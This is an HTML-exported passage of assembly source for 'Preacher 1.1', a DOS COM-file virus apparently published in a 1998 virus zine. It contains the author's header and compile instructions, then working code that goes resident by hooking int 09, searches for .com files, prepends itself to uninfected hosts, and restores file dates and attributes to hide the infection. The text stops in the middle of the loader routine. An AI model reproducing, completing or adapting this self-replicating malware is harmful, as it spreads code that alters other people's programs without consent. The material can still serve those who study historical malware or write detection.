<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;   HEX-FILES No. 2                                                   File 002 </span><span class="sc0">
</span><span class="sc1">;  ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;                                 Preacher 1.1</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;                                      by</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;                                     Mikee</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     Preacher goes resident as a low memory TSR (one full segment!). It </span><span class="sc0">
</span><span class="sc1">;     hooks Int 09. Unlike majority of file infectors, it does not hook </span><span class="sc0">
</span><span class="sc1">;     int 21. Infection is carried through int 09 instead. To avoid </span><span class="sc0">
</span><span class="sc1">;     crashing the system, Preacher checks InDOS or the DOS busy flag to </span><span class="sc0">
</span><span class="sc1">;     check if DOS is processing an Int 21 function. </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     Preacher only infects COM files through DOS' find file functions. It </span><span class="sc0">
</span><span class="sc1">;     is prepended to programs and is 524 bytes long.  Contains texts </span><span class="sc0">
</span><span class="sc1">;     "PREACHER" (also used to check files for infection) and "Jesus </span><span class="sc0">
</span><span class="sc1">;     Reigns!".  These are not displayed.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     Preacher is still on the development phase. You can expect a better </span><span class="sc0">
</span><span class="sc1">;     and expanded version in the future.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  ฤฤ PREACHER.ASM STARTS HERE ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ </span><span class="sc0">
 
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; HEX-FILES No. 2                                         March 1998</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; Virus:        Preacher 1.1 </span><span class="sc0">
 </span><span class="sc1">; Author:       Mikee</span><span class="sc0">
 </span><span class="sc1">; Date Written: 24 February 1998</span><span class="sc0">
 </span><span class="sc1">; Origin:       Lagro, Novaliches, Quezon City, Philippines</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;===================================================================</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;                        * Dedication *</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; This virii is dedicated to my loving girlfriend - Tata Nolasco and </span><span class="sc0">
 </span><span class="sc1">; to my one and only Saviour - JESUS CHRIST!</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; I give thanks to the source of my strength, patience, and wisdom </span><span class="sc0">
 </span><span class="sc1">; who again is the Lord JESUS Christ.</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;===================================================================</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; This source code could be compiled in TASM or MASM.</span><span class="sc0">
 </span><span class="sc1">; Compile to COM.</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; Preacher 1.1 is made on a clean thought and on a principle of not </span><span class="sc0">
 </span><span class="sc1">; damaging units it infects.  Any damages caused by it due either to </span><span class="sc0">
 </span><span class="sc1">; modifications made by the holder or by bugs within the virii is by </span><span class="sc0">
 </span><span class="sc1">; no means the progammer's responsibility.  All responsibility and </span><span class="sc0">
 </span><span class="sc1">; precautions is in the hand of the end user.</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0">
  </span><span class="sc9">.code</span><span class="sc0">
 
 </span><span class="sc1">;-------------------------------------------------- constants</span><span class="sc0">
         </span><span class="sc5">_limit</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                  </span><span class="sc1">; int 09 counter</span><span class="sc0">
 
 </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------- start of preacher virus</span><span class="sc0">
 </span><span class="sc5">start_preacher</span><span class="sc4">:</span><span class="sc0">
 
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">load_preacher</span><span class="sc0">
 
 </span><span class="sc1">;-------------------------------------------------- virus signature</span><span class="sc0">
         </span><span class="sc5">preacher</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PREACHER"</span><span class="sc0">          
 
 </span><span class="sc1">;-------------------------------------------------- data area</span><span class="sc0">
         </span><span class="sc5">preacher_temp</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\p~~~tmp'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; temporary file</span><span class="sc0">
 
         </span><span class="sc5">maske</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; target</span><span class="sc0">
 
 
 </span><span class="sc1">;-------------------------------------------------- interrupt handler of </span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------- preacher virus</span><span class="sc0">
 
 </span><span class="sc5">kernel_preacher</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">                             </span><span class="sc1">; marker</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">old_int</span><span class="sc0">                 </span><span class="sc1">; call old interrupt</span><span class="sc0">
 
         </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">preacher_counter</span><span class="sc0">         </span><span class="sc1">; increment counter</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">preacher_counter</span><span class="sc4">,</span><span class="sc5">_limit</span><span class="sc0">  </span><span class="sc1">; has it reached limit? </span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">activate_preacher_kernel</span><span class="sc0">     </span><span class="sc1">; yes - activate virus</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_preacher_kernel_2</span><span class="sc0">      </span><span class="sc1">; no - exit handler</span><span class="sc0">
 
 
 </span><span class="sc5">activate_preacher_kernel</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">preacher_counter</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; reset counter</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">busy_off</span><span class="sc0">              </span><span class="sc1">; get off and seg address  </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">busy_seg</span><span class="sc0">              </span><span class="sc1">; of indos</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; int 21h issued?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">proceed2</span><span class="sc0">                     </span><span class="sc1">; no - continue</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_preacher_kernel</span><span class="sc0">        </span><span class="sc1">; yes - exit handler</span><span class="sc0">
 
 </span><span class="sc5">proceed2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">                             </span><span class="sc1">; enable interrupts &amp;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                      </span><span class="sc1">; get address of current dta</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">dta_off</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; and save it</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">dta_seg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; now set up segment registers</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; and set up preacher's </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                      </span><span class="sc1">; own disk transfer area</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                      </span><span class="sc1">; search for first file to </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maske</span><span class="sc0">             </span><span class="sc1">; infect </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; found?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">check_for_infection</span><span class="sc0">         </span><span class="sc1">; yes - check if infected</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_dta</span><span class="sc0">                 </span><span class="sc1">; no - exit handler</span><span class="sc0">
 
 </span><span class="sc5">search_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                      </span><span class="sc1">; search loop</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; no more files?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">check_for_infection</span><span class="sc0">          </span><span class="sc1">; no - check next file for infection</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_dta</span><span class="sc0">                 </span><span class="sc1">; yes - exit handler</span><span class="sc0">
 
 </span><span class="sc5">check_for_infection</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; check found file for infection</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc0">                      </span><span class="sc1">; is file to big?</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; yes - search next</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc4">-</span><span class="sc5">preacher_len</span><span class="sc0">     </span><span class="sc1">; is it still big?</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">search_loop</span><span class="sc0">                  </span><span class="sc1">; yes - search next</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">                    </span><span class="sc1">; open file for read access</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">_001</span><span class="sc0">                        
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_dta</span><span class="sc0">
 </span><span class="sc5">_001</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; read 11 bytes into inbuf</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inbuf</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_preacher</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inbuf</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                      </span><span class="sc1">; first 11 bytes the same?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">next_check</span><span class="sc0">                  </span><span class="sc1">; no - proceed with check</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; yes - close file and</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> 
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; search next</span><span class="sc0">
 </span><span class="sc5">next_check</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">inbuf</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">                </span><span class="sc1">; is file starting with "M" (This is </span><span class="sc0">
                                         </span><span class="sc1">; used to ensure that the file is a </span><span class="sc0">
                                         </span><span class="sc1">; true com file and an exe file </span><span class="sc0">
                                         </span><span class="sc1">; renamed to com)</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">search_loop</span><span class="sc0">                  </span><span class="sc1">; yes - search next</span><span class="sc0">
 
 </span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; infection routine</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; close file previously opened by</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; search &amp; check</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">; set attributes to normal</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">restore_dta</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                    </span><span class="sc1">; open for read/write</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">restore_dta</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">9ah</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; get length of file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">infect_len</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; read cx bytes to end of virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">end_preacher</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                    </span><span class="sc1">; reset r/w pointer to start of file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_preacher</span><span class="sc0">    </span><span class="sc1">; write preacher's code to start</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">preacher_len</span><span class="sc0">             </span><span class="sc1">; of host file and append host</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">9ah</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                    </span><span class="sc1">; restore file date and time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">96h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">98h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; close file and </span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">; restore attributes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">95h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
 </span><span class="sc1">;-------------------------------------------------- infection finished</span><span class="sc0">
 </span><span class="sc5">restore_dta</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                      </span><span class="sc1">; restore DTA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">dta_off</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">dta_seg</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         
         
 </span><span class="sc5">exit_preacher_kernel</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc5">exit_preacher_kernel_2</span><span class="sc4">:</span><span class="sc0">
 
         </span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">
 
 </span><span class="sc5">kernel_preacher</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
 
 </span><span class="sc1">;-------------------------------------------------- the process to load virus</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------- into memory</span><span class="sc0">
 
 </span><span class="sc5">load_preacher</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">                     </span><span class="sc1">; free some memory space</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
 
 </span><span class="sc5">preacher_restore</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; restore host file by</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">                      </span><span class="sc1">; by creating temp file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                        </span><span class="sc1">; with hidden attribute</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">preacher_temp</span><span class="sc0">     </span><span class="sc1">; then</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">preacher_create_ok</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">found_preacher</span><span class="sc0">
 
 </span><span class="sc5">preacher_create_ok</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; rewrite code to file</span><span class="sc0">
